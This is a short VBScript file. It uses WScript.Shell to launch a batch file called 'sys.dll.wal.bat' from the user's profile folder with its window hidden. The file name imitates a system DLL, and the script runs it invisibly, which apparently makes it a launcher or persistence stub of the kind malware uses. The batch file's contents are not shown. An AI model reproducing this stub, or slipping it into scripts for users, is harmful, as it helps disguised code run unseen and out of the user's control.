Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Users\%username%\sys.dll.wal.bat" & Chr(34), 0
Set WshShell = Nothing